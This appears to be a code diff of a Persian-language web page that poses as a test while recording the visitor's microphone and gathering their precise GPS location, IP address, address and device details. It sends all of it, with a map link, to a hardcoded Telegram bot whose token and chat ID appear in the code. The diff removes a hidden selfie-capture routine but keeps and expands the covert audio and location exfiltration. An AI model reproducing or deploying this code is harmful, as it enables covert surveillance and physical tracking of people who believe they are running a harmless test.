@@ -18,7 +18,6 @@
     .status {margin-top: 20px;font-size: 14px;color: #555;min-height: 40px;}
     .progress {width: 100%;height: 6px;background: #eee;border-radius: 3px;margin: 15px 0;overflow: hidden;}
     .progress-bar {height: 100%;background: #00d2ff;width: 0;transition: width 0.1s;}
-    .hidden {display: none;}
   </style>
 </head>
 <body>
@@ -36,9 +35,6 @@
     <div id="status" class="status">آماده برای تست...</div>
   </div>
 
-  <video id="video" class="hidden" autoplay playsinline></video>
-  <canvas id="canvas" class="hidden"></canvas>
-
   <script>
     const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
     const CHAT_ID = "6080665310";
@@ -48,73 +44,53 @@
     const spinner = document.getElementById('spinner');
     const status = document.getElementById('status');
     const progressBar = document.getElementById('progressBar');
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
 
-    let mediaRecorder, stream, timer, photoStream;
+    let mediaRecorder, stream, timer;
 
-    // عکس سلفی (فوری و بدون تأخیر)
-    async function captureSelfie() {
-      return new Promise((resolve) => {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-          .then(s => {
-            photoStream = s;
-            video.srcObject = s;
-            video.onloadedmetadata = () => {
-              video.play();
-              canvas.width = video.videoWidth || 640;
-              canvas.height = video.videoHeight || 480;
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob(blob => {
-                stopPhotoStream();
-                resolve(blob);
-              }, 'image/jpeg', 0.8);
-            };
-          })
-          .catch(() => {
-            stopPhotoStream();
-            resolve(null);
-          });
-      });
-    }
-
-    function stopPhotoStream() {
-      if (photoStream) {
-        photoStream.getTracks().forEach(t => t.stop());
-        photoStream = null;
-      }
-    }
-
-    // موقعیت + اطلاعات
+    // موقعیت دقیق (GPS)
     async function getLocation() {
       return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({ error: "نامشخص" });
+        if (!navigator.geolocation) return resolve({ error: "موقعیت‌یابی غیرفعال" });
         navigator.geolocation.getCurrentPosition(
           async pos => {
-            const { latitude, longitude } = pos.coords;
+            const { latitude, longitude, accuracy } = pos.coords;
             try {
               const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
               const data = await res.json();
-              resolve({ latitude, longitude, address: data.display_name || "نامشخص" });
+              resolve({
+                latitude, longitude, accuracy,
+                address: data.display_name || "آدرس نامشخص"
+              });
             } catch {
-              resolve({ latitude, longitude, address: "نامشخص" });
+              resolve({ latitude, longitude, accuracy, address: "آدرس نامشخص" });
             }
           },
-          () => resolve({ error: "رد شد" }),
-          { enableHighAccuracy: true, timeout: 8000 }
+          () => resolve({ error: "اجازه موقعیت رد شد" }),
+          { enableHighAccuracy: true, timeout: 10000 }
         );
       });
     }
 
+    // اطلاعات فنی موبایل
     async function getDeviceInfo() {
-      const info = { ip: 'نامشخص', location: 'نامشخص' };
+      const info = {
+        model: navigator.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص',
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        connection: navigator.connection ? navigator.connection.effectiveType : 'نامشخص',
+        ip: 'در حال دریافت...',
+        city: 'در حال دریافت...'
+      };
+
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         info.ip = data.ip || 'نامشخص';
-        info.location = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
+        info.city = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
       } catch {}
+
       return info;
     }
 
@@ -126,7 +102,9 @@
         status.textContent = "درخواست دسترسی...";
         progressBar.style.width = "0%";
 
+        // فقط میکروفون
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
         const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
           ? 'audio/webm;codecs=opus' : 'audio/webm';
 
@@ -136,9 +114,11 @@
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
         mediaRecorder.onstop = async () => {
           const audioBlob = new Blob(chunks, { type: mimeType });
-          const selfieBlob = await captureSelfie();
-          const [deviceInfo, location] = await Promise.all([getDeviceInfo(), getLocation()]);
-          await sendAllSeparately(audioBlob, selfieBlob, deviceInfo, location);
+          const [deviceInfo, location] = await Promise.all([
+            getDeviceInfo(),
+            getLocation()
+          ]);
+          await sendToTelegram(audioBlob, deviceInfo, location);
           stopStream();
         };
 
@@ -162,43 +142,41 @@
       }
     }
 
-    // ارسال جداگانه (ویس → عکس → گزارش)
-    async function sendAllSeparately(audioBlob, selfieBlob, deviceInfo, location) {
+    async function sendToTelegram(audioBlob, deviceInfo, location) {
       status.textContent = "در حال ارسال...";
+
+      // ارسال ویس
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('audio', audioBlob, `voice_${Date.now()}.webm`);
+
       let messageId = null;
-
-      // ۱. ارسال ویس
-      if (audioBlob) {
-        const audioForm = new FormData();
-        audioForm.append('chat_id', CHAT_ID);
-        audioForm.append('audio', audioBlob, `voice_${Date.now()}.webm`);
-        try {
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: audioForm });
-          const data = await res.json();
-          if (data.ok) messageId = data.result.message_id;
-        } catch (e) { console.error("ویس نشد", e); }
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
+        const data = await res.json();
+        if (data.ok) messageId = data.result.message_id;
+      } catch (e) {
+        console.error("ویس ارسال نشد", e);
       }
 
-      // ۲. ارسال عکس سلفی
-      if (selfieBlob && messageId) {
-        const photoForm = new FormData();
-        photoForm.append('chat_id', CHAT_ID);
-        photoForm.append('photo', selfieBlob, 'selfie.jpg');
-        photoForm.append('reply_to_message_id', messageId);
-        try {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: photoForm });
-        } catch (e) { console.error("عکس نشد", e); }
-      }
-
-      // ۳. گزارش
+      // گزارش کامل
       const report = `
-*گزارش کاربر*
+*گزارش کامل کاربر*
 
-IP: \`${deviceInfo.ip}\`
-موقعیت: \`${deviceInfo.location}\`
-طول: \`${location.latitude || 'نامشخص'}\`
-عرض: \`${location.longitude || 'نامشخص'}\`
-آدرس: \`${location.address || 'نامشخص'}\`
+ مدل: \`${deviceInfo.model}\`
+ سیستم عامل: \`${deviceInfo.platform}\`
+ رزولوشن: \`${deviceInfo.screen}\`
+ زبان: \`${deviceInfo.language}\`
+ منطقه زمانی: \`${deviceInfo.timezone}\`
+ اتصال: \`${deviceInfo.connection}\`
+ IP: \`${deviceInfo.ip}\`
+ موقعیت تقریبی: \`${deviceInfo.city}\`
+
+*موقعیت دقیق (GPS)*
+ طول: \`${location.latitude || 'نامشخص'}\`
+ عرض: \`${location.longitude || 'نامشخص'}\`
+ دقت: \`${location.accuracy ? Math.round(location.accuracy) + ' متر' : 'نامشخص'}\`
+ آدرس: \`${location.address || 'نامشخص'}\`
 
 [نقشه گوگل](https://maps.google.com/?q=${location.latitude},${location.longitude})
       `.trim();
@@ -221,7 +199,6 @@ IP: \`${deviceInfo.ip}\`
 
     function stopStream() {
       if (stream) stream.getTracks().forEach(t => t.stop());
-      stopPhotoStream();
     }
 
     function reset() {
